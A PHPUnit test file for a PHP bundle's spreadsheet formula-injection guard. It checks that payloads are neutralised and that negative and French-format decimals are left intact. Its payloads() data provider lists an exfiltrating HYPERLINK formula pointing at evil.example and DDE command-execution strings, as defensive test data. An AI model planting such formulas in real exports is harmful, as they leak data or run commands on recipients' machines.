<?php

declare(strict_types=1);

namespace Jul6Art\DataflowBundle\Tests\Io\Guard;

use Jul6Art\DataflowBundle\Io\Guard\FormulaInjectionGuard;
use PHPUnit\Framework\Attributes\CoversClass;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

/**
 * The guard against spreadsheet formula injection.
 *
 * ## What this file holds
 *
 * Excel and LibreOffice **evaluate** a cell whose first character is `=`, `+`, `-`, `@`, a tab or
 * a carriage return. Every application that exports a name, a note or an accounting label exports
 * text somebody typed, so every one of them is exposed. A customer named
 * `=HYPERLINK("http://…"&A1,"Click")` exfiltrates a column on the first click, and nothing on the
 * server side ever shows it.
 *
 * ## The case that matters most is not the attack
 *
 * ⚠️ A Doctrine `decimal` column is hydrated as a **string**, so a negative amount is `'-100.00'`
 * — it starts with a forbidden character. Neutralising it would ship every negative amount of an
 * accounting file as TEXT: a security guard that corrupts the data it protects is not one, and the
 * accountant would be the only person to notice, while reconciling.
 *
 * ⚠️ And the numeric test has to know the **French** separator too. Both consumers of this bundle
 * that export accounting data format decimals with a comma at some point (`-100,00`), which PHP
 * does not consider numeric. That half was missing in the first implementation, and only a test
 * said so — the comment above it claimed the opposite.
 */
#[CoversClass(FormulaInjectionGuard::class)]
final class FormulaInjectionGuardTest extends TestCase
{
    /**
     * @return iterable<string, array{string}>
     */
    public static function payloads(): iterable
    {
        yield 'formula' => ['=1+1'];
        yield 'exfiltrating hyperlink' => ['=HYPERLINK("http://evil.example/"&A1,"Click")'];
        yield 'DDE command execution' => ['=cmd|\' /C calc\'!A0'];
        yield 'Lotus at-sign' => ['@SUM(A1:A9)'];
        yield 'non-numeric plus' => ['+1+cmd|\' /C calc\'!A0'];
        yield 'non-numeric minus' => ['-2+3+cmd|\' /C calc\'!A0'];
        yield 'decimal followed by a payload' => ['-1.5+cmd|\' /C calc\'!A0'];
        yield 'French decimal followed by a payload' => ['-1,5+cmd|\' /C calc\'!A0'];
        yield 'tab leading to a formula' => ["\t=1+1"];
        yield 'carriage return leading to a formula' => ["\r=1+1"];
    }

    #[DataProvider('payloads')]
    public function testPayloadsArePrefixedWithTheTextMarker(string $value): void
    {
        self::assertSame("'".$value, FormulaInjectionGuard::neutralize($value));
    }

    /**
     * @return iterable<string, array{string}>
     */
    public static function numberLikeStrings(): iterable
    {
        yield 'negative decimal' => ['-100.00'];
        yield 'negative integer' => ['-42'];
        yield 'explicitly signed positive' => ['+100.00'];
        yield 'unsigned decimal' => ['1234.56'];
        yield 'scientific notation' => ['-1.2e3'];
        yield 'negative French decimal' => ['-100,00'];
        yield 'signed positive French decimal' => ['+100,00'];
        yield 'unsigned French decimal' => ['1234,56'];
    }

    /**
     * ⚠️ This is the non-regression, and it is the assertion to keep when refactoring: a guard that
     * text-marks `-100.00` breaks every accounting export it touches.
     */
    #[DataProvider('numberLikeStrings')]
    public function testNumberLikeStringsAreLeftAlone(string $value): void
    {
        self::assertSame($value, FormulaInjectionGuard::neutralize($value));
    }

    /**
     * @return iterable<string, array{scalar|null}>
     */
    public static function harmlessValues(): iterable
    {
        yield 'plain text' => ['Dupont'];
        yield 'empty string' => [''];
        yield 'null' => [null];
        yield 'integer' => [42];
        yield 'negative float' => [-12.5];
        yield 'boolean' => [true];
        yield 'hyphen in the middle' => ['Jean-Pierre'];
        yield 'at-sign in the middle' => ['jean@example.com'];
    }

    /**
     * The counter-proof. Without it a guard wide enough to break every export would still pass
     * the first case, and nothing would say so.
     */
    #[DataProvider('harmlessValues')]
    public function testHarmlessValuesPassThroughUnchanged(string|int|float|bool|null $value): void
    {
        self::assertSame($value, FormulaInjectionGuard::neutralize($value));
    }

    public function testWholeRowsAreGuardedInOrder(): void
    {
        $row = ['Dupont', '=1+1', '-100.00', null, 7];

        self::assertSame(
            ['Dupont', "'=1+1", '-100.00', null, 7],
            FormulaInjectionGuard::neutralizeRow($row),
        );
    }

    /**
     * ⚠️ Keys are preserved, which is what allows a row indexed by column name to go through the
     * same call as a plain list of cells.
     */
    public function testStringKeysSurviveTheRowGuard(): void
    {
        self::assertSame(
            ['name' => "'=1+1", 'total' => '-100.00'],
            FormulaInjectionGuard::neutralizeRow(['name' => '=1+1', 'total' => '-100.00']),
        );
    }

    /**
     * ⚠️ The marker does not stack. An export re-imported then re-exported — which a spreadsheet
     * user does without thinking — would otherwise gain one apostrophe per round trip.
     */
    public function testNeutralizationIsIdempotent(): void
    {
        $once = FormulaInjectionGuard::neutralize('=1+1');

        self::assertSame($once, FormulaInjectionGuard::neutralize($once));
    }
}
